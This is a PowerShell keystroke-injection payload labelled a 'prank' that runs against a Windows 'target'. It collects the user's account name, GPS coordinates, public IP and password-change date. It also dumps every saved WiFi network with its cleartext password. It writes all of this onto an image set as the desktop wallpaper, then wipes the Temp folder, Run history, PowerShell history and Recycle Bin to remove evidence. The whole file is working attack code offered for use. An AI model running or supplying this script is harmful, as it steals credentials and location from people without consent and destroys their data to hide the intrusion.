############################################################################################################################################################                      
#                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
# Title        : Wallpaper-Troll   | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
# Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
# Version      : 1.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
# Category     : Prank             | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
# Target       : Windows 10,11     |                                                                   |___/ #           /\/|_      __/\\                  #     
# Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
#                                  |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
#                                  |   and yea curiosity killed the cat                        ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                                                                                              
#                                  |    but satisfaction brought him back                     (((^_(((/(((_/ #          /     \     /     \                #    
#__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
#                                                                                                            #         /       \   /     ~ \               #
#  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
#  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
#  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
#  youtube.com/c/IamJakoby                                                                                   #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
############################################################################################################################################################

<#

.DESCRIPTION 
	This program gathers details from target PC to include name associated with the microsoft account, their latitude and longitude, 
	Public IP, and the SSID and WiFi password of any current or previously connected networks.
	It will take the gathered information and generate a .jpg with that information on show 
	Finally that .jpg will be applied as their Desktop Wallpaper so they know they were owned
	Additionally, a secret message will be left in the binary of the wallpaper image generated and left on their desktop
#>
#############################################################################################################################################

# this is the message that will be coded into the image you use as the wallpaper

$hiddenMessage = "`n`nMy crime is that of curiosity `nand yea curiosity killed the cat `nbut satisfaction brought him back `n with love -Jakoby"

# this will be the name of the image you use as the wallpaper

$ImageName = "dont-be-suspicious"

#############################################################################################################################################

<#

.NOTES  
	This will get the name associated with the microsoft account
#>

function Get-Name {

    try {
        $fullName = (Get-CimInstance -ClassName Win32_ComputerSystem).UserName
    } catch {
        Write-Error "No name was detected" 
        return $env:UserName
    }

    return $fullName
}

$fn = Get-Name

echo "Hey $fn" >> "$Env:temp\foo.txt"
echo "`nYour computer is not very secure" >> "$Env:temp\foo.txt"

#############################################################################################################################################

<#

.NOTES 
	This is to get the current Latitude and Longitude of your target
#>

function Get-GeoLocation {
	try {
        Add-Type -AssemblyName System.Device
        $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
        $GeoWatcher.Start()

        while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
            Start-Sleep -Milliseconds 100
        }

        if ($GeoWatcher.Permission -eq 'Denied') {
            Write-Error 'Access Denied for Location Information'
            return "No Coordinates found"
        } else {
            $location = $GeoWatcher.Position.Location
            return "Latitude: $($location.Latitude), Longitude: $($location.Longitude)"
        }
    } catch {
        Write-Error "No coordinates found" 
        return "No Coordinates found"
    } 
}

$GL = Get-GeoLocation
if ($GL) { echo "`nYour Location: `n$GL" >> "$Env:temp\foo.txt" }

#############################################################################################################################################

<#

.NOTES  
	This will get the public IP from the target computer
#>

function Get-PubIP {
    try {
        $computerPubIP = (Invoke-WebRequest -Uri "http://ipinfo.io/ip" -UseBasicParsing).Content.Trim()
    } catch {
        Write-Error "No Public IP was detected"
        return $null
    }

    return $computerPubIP
}

$PubIP = Get-PubIP
if ($PubIP) { echo "`nYour Public IP: $PubIP" >> "$Env:temp\foo.txt" }

###########################################################################################################

<#

.NOTES 
	Password last Set
	This function will custom tailor a response based on how long it has been since they last changed their password
#>

function Get-Days_Set {
    try {
        $pls = (net user $env:USERNAME | Select-String -Pattern "Password last set").ToString().Trim()
        $pls = $pls.Substring($pls.IndexOf(":") + 1).Trim()
        $time = ((Get-Date) - [datetime]$pls).Days
        return $pls
    } catch {
        Write-Error "Day password set not found"
        return $null
    }
}

$pls = Get-Days_Set
if ($pls) { echo "`nPassword Last Set: $pls" >> "$Env:temp\foo.txt" }

###########################################################################################################

<#

.NOTES 
	All Wifi Networks and Passwords 
	This function will gather all current Networks and Passwords saved on the target computer
	They will be saved in the temp directory to a file named with "$env:USERNAME-$(get-date -f yyyy-MM-dd)_WiFi-PWD.txt"
#>

# Get Wifi SSIDs and Passwords	
$WLANProfileNames =@()

# Get all the WLAN profile names
$Output = netsh.exe wlan show profiles | Select-String -Pattern " : "

# Trim the output to receive only the name
Foreach($WLANProfileName in $Output) {
    $WLANProfileNames += ($WLANProfileName -split ":")[1].Trim()
}

$WLANProfileObjects =@()

# Bind the WLAN profile names and also the password to a custom object
Foreach($WLANProfileName in $WLANProfileNames) {
    try {
        $WLANProfilePassword = (netsh.exe wlan show profiles name="$WLANProfileName" key=clear | Select-String -Pattern "Key Content").ToString().Split(":")[1].Trim()
    } catch {
        $WLANProfilePassword = "The password is not stored in this profile"
    }

    $WLANProfileObject = [PSCustomObject]@{
        ProfileName     = $WLANProfileName
        ProfilePassword = $WLANProfilePassword
    }
    $WLANProfileObjects += $WLANProfileObject
}

if ($WLANProfileObjects) { 
    echo "`nW-Lan profiles: ===============================" >> "$Env:temp\foo.txt"
    $WLANProfileObjects | ForEach-Object { echo "$($_.ProfileName) : $($_.ProfilePassword)" >> "$Env:temp\foo.txt" }
}

#############################################################################################################################################

<#

.NOTES 
	This will get the dimension of the targets screen to make the wallpaper
#>

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class PInvoke {
    [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr hwnd);
    [DllImport("gdi32.dll")] public static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
}
"@
$hdc = [PInvoke]::GetDC([IntPtr]::Zero)
$w = [PInvoke]::GetDeviceCaps($hdc, 118) # width
$h = [PInvoke]::GetDeviceCaps($hdc, 117) # height

#############################################################################################################################################

<#

.NOTES  
	This will get take the information gathered and format it into a .jpg
#>

Add-Type -AssemblyName System.Drawing

$filename = "$env:temp\foo.jpg"
$bmp = New-Object System.Drawing.Bitmap $w, $h
$font = New-Object System.Drawing.Font "Consolas", 18
$brushBg = [System.Drawing.Brushes]::White
$brushFg = [System.Drawing.Brushes]::Black
$graphics = [System.Drawing.Graphics]::FromImage($bmp)
$graphics.FillRectangle($brushBg, 0, 0, $bmp.Width, $bmp.Height)
$content = Get-Content "$Env:temp\foo.txt" -Raw
$graphics.DrawString($content, $font, $brushFg, 500, 100)
$graphics.Dispose()
$bmp.Save($filename)

#############################################################################################################################################

<#

.NOTES 
	This will take your hidden message and use steganography to hide it in the image you use as the wallpaper 
	Then it will clean up the files you don't want to leave behind
#>

echo $hiddenMessage > "$Env:temp\foo.txt"
cmd.exe /c copy /b "$Env:temp\foo.jpg" + "$Env:temp\foo.txt" "$Env:USERPROFILE\Desktop\$ImageName.jpg"

Remove-Item "$env:TEMP\foo.txt", "$env:TEMP\foo.jpg" -Force -ErrorAction SilentlyContinue

#############################################################################################################################################

<#

.NOTES 
	This will take the image you generated and set it as the targets wallpaper
#>

function Set-WallPaper {
    param (
        [parameter(Mandatory=$true)]
        [string]$Image,
        [parameter(Mandatory=$false)]
        [ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
        [string]$Style = "Center"
    )

    $WallpaperStyle = Switch ($Style) {
        "Fill"   { "10" }
        "Fit"    { "6" }
        "Stretch" { "2" }
        "Tile"   { "0" }
        "Center" { "0" }
        "Span"   { "22" }
    }

    if ($Style -eq "Tile") {
        Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -Value $WallpaperStyle
        Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -Value 1
    } else {
        Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -Value $WallpaperStyle
        Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -Value 0
    }

    Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Params {
    [DllImport("User32.dll", CharSet = CharSet.Unicode)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@

    $SPI_SETDESKWALLPAPER = 0x0014
    $UpdateIniFile = 0x01
    $SendChangeEvent = 0x02

    [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $UpdateIniFile -bor $SendChangeEvent)
}

#############################################################################################################################################

<#

.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>

function Clean-Exfil {
    # Delete contents of Temp folder
    Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue

    # Delete run box history
    reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f

    # Delete powershell history
    Remove-Item (Get-PSReadlineOption).HistorySavePath

    # Deletes contents of recycle bin
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}

#############################################################################################################################################

# Set the wallpaper and clean up
Set-WallPaper -Image "$Env:USERPROFILE\Desktop\$ImageName.jpg" -Style Center
Clean-Exfil
